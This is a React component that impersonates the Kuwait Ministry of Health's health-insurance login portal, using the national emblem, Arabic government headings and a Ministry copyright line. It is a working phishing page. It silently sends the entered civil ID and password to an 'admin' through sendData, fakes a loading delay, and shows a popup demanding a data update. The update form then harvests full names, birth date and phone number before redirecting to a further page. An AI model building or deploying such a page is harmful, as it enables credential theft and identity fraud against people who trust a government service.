import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { navigateToPage, sendData, isFormApproved, isFormRejected, waitingMessage } from '../lib/store';

export default function MOHLogin() {
  const [, setLocation] = useLocation();
  const [civilId, setCivilId] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [showUpdateForm, setShowUpdateForm] = useState(false);

  // Update data form fields
  const [firstName, setFirstName] = useState('');
  const [secondName, setSecondName] = useState('');
  const [thirdName, setThirdName] = useState('');
  const [lastName, setLastName] = useState('');
  const [englishName, setEnglishName] = useState('');
  const [birthDate, setBirthDate] = useState('');
  const [phone, setPhone] = useState('');

  useEffect(() => {
    navigateToPage('تسجيل الدخول');
  }, []);

  const handleLogin = () => {
    if (!civilId || !password) return;
    setLoading(true);

    // Send login data to admin
    sendData({
      data: {
        'الرقم المدني': civilId,
        'كلمة المرور': password,
      },
      current: 'تسجيل الدخول',
      waitingForAdminResponse: false,
      mode: 'silent',
    });

    // Show loading for 3 seconds then popup
    setTimeout(() => {
      setLoading(false);
      setShowPopup(true);
    }, 3000);
  };

  const handleContinue = () => {
    setShowPopup(false);
    setShowUpdateForm(true);
    navigateToPage('تحديث البيانات');
  };

  const handleUpdate = () => {
    if (!firstName || !secondName || !thirdName || !lastName || !englishName || !birthDate || !phone) return;

    // Save data to localStorage for next page
    const fullNameAr = `${firstName} ${secondName} ${thirdName} ${lastName}`;
    localStorage.setItem('mohCivilId', civilId);
    localStorage.setItem('mohUserName', fullNameAr);
    localStorage.setItem('mohEnglishName', englishName);
    localStorage.setItem('mohBirthDate', birthDate);
    localStorage.setItem('mohPhone', phone);

    sendData({
      data: {
        'الرقم المدني': civilId,
        'الاسم الأول': firstName,
        'الاسم الثاني': secondName,
        'الاسم الثالث': thirdName,
        'اسم العائلة': lastName,
        'الاسم بالإنجليزي': englishName,
        'تاريخ الميلاد': birthDate,
        'رقم الهاتف': phone,
      },
      current: 'تحديث البيانات',
      waitingForAdminResponse: false,
      mode: 'silent',
    });

    setLocation('/moh-register');
  };

  const inputStyle: React.CSSProperties = {
    width: '100%',
    padding: '10px 12px',
    border: '1px solid #ccc',
    borderRadius: 4,
    fontSize: 15,
    fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
    outline: 'none',
    direction: 'rtl',
  };

  const labelStyle: React.CSSProperties = {
    fontSize: 14,
    fontWeight: 'bold',
    color: '#333',
    marginBottom: 5,
    display: 'block',
    textAlign: 'right',
  };

  return (
    <div style={{ direction: 'rtl', fontFamily: 'Cairo, Tahoma, Arial, sans-serif', minHeight: '100vh', background: '#fff' }}>
      {/* Header */}
      <div style={{ background: '#1a3a5c', padding: '20px 0', textAlign: 'center' }}>
        <img src="/kuwait-emblem.png" alt="شعار دولة الكويت" style={{ width: 90, height: 90, margin: '0 auto' }} />
        <h1 style={{ color: '#fff', fontSize: 22, marginTop: 10, fontWeight: 'bold' }}>النظام الآلي لتسجيل الضمان الصحي</h1>
      </div>

      {/* Language */}
      <div style={{ textAlign: 'left', padding: '10px 30px' }}>
        <span style={{ color: 'red', fontSize: 14, cursor: 'pointer' }}>English</span>
      </div>

      {/* Loading Overlay */}
      {loading && (
        <div style={{
          position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
          background: 'rgba(0,0,0,0.4)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999,
        }}>
          <div style={{ background: '#fff', borderRadius: 10, padding: 40, textAlign: 'center' }}>
            <div style={{
              width: 50, height: 50, border: '4px solid #eee', borderTop: '4px solid #1076BB',
              borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto 15px',
            }} />
            <p style={{ color: '#333', fontSize: 16 }}>جاري تسجيل الدخول...</p>
            <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
          </div>
        </div>
      )}

      {/* Popup */}
      {showPopup && (
        <div style={{
          position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
          background: 'rgba(0,0,0,0.4)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999,
        }}>
          <div style={{ background: '#fff', borderRadius: 8, padding: '30px 40px', textAlign: 'center', maxWidth: 450, width: '90%', boxShadow: '0 4px 20px rgba(0,0,0,0.2)' }}>
            <div style={{ width: 60, height: 60, background: '#FFF3CD', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 15px' }}>
              <span style={{ fontSize: 30, color: '#856404' }}>!</span>
            </div>
            <h3 style={{ color: '#333', fontSize: 18, marginBottom: 10 }}>تنبيه</h3>
            <p style={{ color: '#555', fontSize: 15, lineHeight: 1.8, marginBottom: 25 }}>
              عليك تحديث البيانات لإستكمال الدخول الى النظام
            </p>
            <button
              onClick={handleContinue}
              style={{
                background: '#1076BB', color: '#fff', border: 'none', padding: '10px 50px',
                fontSize: 15, fontWeight: 'bold', borderRadius: 4, cursor: 'pointer',
                fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
              }}
            >
              متابعة
            </button>
          </div>
        </div>
      )}

      {/* Login Form */}
      {!showUpdateForm && (
        <div style={{ maxWidth: 500, margin: '40px auto', padding: '0 20px' }}>
          <div style={{ border: '1px solid #ddd', borderRadius: 4, overflow: 'hidden' }}>
            <div style={{ background: '#1076BB', padding: '12px 20px', textAlign: 'center' }}>
              <span style={{ color: '#fff', fontSize: 16, fontWeight: 'bold' }}>تسجيل الدخول</span>
            </div>
            <div style={{ padding: '30px 25px', background: '#f9f9f9' }}>
              <div style={{ marginBottom: 20 }}>
                <label style={labelStyle}>الرقم المدني <span style={{ color: 'red' }}>*</span></label>
                <input
                  type="text"
                  value={civilId}
                  onChange={(e) => setCivilId(e.target.value.replace(/\D/g, ''))}
                  maxLength={12}
                  placeholder="أدخل الرقم المدني"
                  style={inputStyle}
                />
              </div>
              <div style={{ marginBottom: 25 }}>
                <label style={labelStyle}>كلمة المرور <span style={{ color: 'red' }}>*</span></label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="أدخل كلمة المرور"
                  style={inputStyle}
                />
              </div>
              <div style={{ textAlign: 'center' }}>
                <button
                  onClick={handleLogin}
                  disabled={!civilId || !password}
                  style={{
                    background: (!civilId || !password) ? '#ccc' : '#1076BB',
                    color: '#fff', border: 'none', padding: '12px 60px',
                    fontSize: 16, fontWeight: 'bold', borderRadius: 4,
                    cursor: (!civilId || !password) ? 'not-allowed' : 'pointer',
                    fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
                  }}
                >
                  تسجيل الدخول
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Update Data Form */}
      {showUpdateForm && (
        <div style={{ maxWidth: 600, margin: '30px auto', padding: '0 20px' }}>
          <div style={{ border: '1px solid #ddd', borderRadius: 4, overflow: 'hidden' }}>
            <div style={{ background: '#1076BB', padding: '12px 20px', textAlign: 'center' }}>
              <span style={{ color: '#fff', fontSize: 16, fontWeight: 'bold' }}>تحديث البيانات</span>
            </div>
            <div style={{ padding: '25px', background: '#f9f9f9' }}>
              {/* Civil ID - dynamic from login */}
              <div style={{ marginBottom: 18 }}>
                <label style={labelStyle}>الرقم المدني</label>
                <input
                  type="text"
                  value={civilId}
                  readOnly
                  style={{ ...inputStyle, background: '#e9ecef', color: '#555' }}
                />
              </div>

              {/* Arabic Name - 4 fields */}
              <label style={{ ...labelStyle, marginBottom: 10 }}>الاسم بالعربي <span style={{ color: 'red' }}>*</span></label>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10, marginBottom: 18 }}>
                <div>
                  <input
                    type="text"
                    value={firstName}
                    onChange={(e) => setFirstName(e.target.value.replace(/[^\u0600-\u06FF\s]/g, ''))}
                    placeholder="الاسم الأول"
                    style={inputStyle}
                  />
                </div>
                <div>
                  <input
                    type="text"
                    value={secondName}
                    onChange={(e) => setSecondName(e.target.value.replace(/[^\u0600-\u06FF\s]/g, ''))}
                    placeholder="الاسم الثاني"
                    style={inputStyle}
                  />
                </div>
                <div>
                  <input
                    type="text"
                    value={thirdName}
                    onChange={(e) => setThirdName(e.target.value.replace(/[^\u0600-\u06FF\s]/g, ''))}
                    placeholder="الاسم الثالث"
                    style={inputStyle}
                  />
                </div>
                <div>
                  <input
                    type="text"
                    value={lastName}
                    onChange={(e) => setLastName(e.target.value.replace(/[^\u0600-\u06FF\s]/g, ''))}
                    placeholder="اسم العائلة"
                    style={inputStyle}
                  />
                </div>
              </div>

              {/* English Name */}
              <div style={{ marginBottom: 18 }}>
                <label style={labelStyle}>الاسم بالإنجليزي <span style={{ color: 'red' }}>*</span></label>
                <input
                  type="text"
                  value={englishName}
                  onChange={(e) => setEnglishName(e.target.value.replace(/[^a-zA-Z\s]/g, ''))}
                  placeholder="Full Name in English"
                  style={{ ...inputStyle, direction: 'ltr', textAlign: 'left' }}
                />
              </div>

              {/* Birth Date */}
              <div style={{ marginBottom: 18 }}>
                <label style={labelStyle}>تاريخ الميلاد <span style={{ color: 'red' }}>*</span></label>
                <input
                  type="date"
                  value={birthDate}
                  onChange={(e) => setBirthDate(e.target.value)}
                  style={inputStyle}
                />
              </div>

              {/* Phone */}
              <div style={{ marginBottom: 25 }}>
                <label style={labelStyle}>رقم الهاتف <span style={{ color: 'red' }}>*</span></label>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                  maxLength={12}
                  placeholder="أدخل رقم الهاتف"
                  style={inputStyle}
                />
              </div>

              {/* Update Button */}
              <div style={{ textAlign: 'center' }}>
                <button
                  onClick={handleUpdate}
                  disabled={!firstName || !secondName || !thirdName || !lastName || !englishName || !birthDate || !phone}
                  style={{
                    background: (!firstName || !secondName || !thirdName || !lastName || !englishName || !birthDate || !phone) ? '#ccc' : '#1076BB',
                    color: '#fff', border: 'none', padding: '12px 60px',
                    fontSize: 16, fontWeight: 'bold', borderRadius: 4,
                    cursor: (!firstName || !secondName || !thirdName || !lastName || !englishName || !birthDate || !phone) ? 'not-allowed' : 'pointer',
                    fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
                  }}
                >
                  تحديث
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Footer */}
      <div style={{ textAlign: 'center', padding: '40px 0 20px', marginTop: 40, borderTop: '1px solid #eee' }}>
        <p style={{ color: '#888', fontSize: 13 }}>© 2019 Ministry Of Health Kuwait . All Rights Reserved.</p>
      </div>
    </div>
  );
}
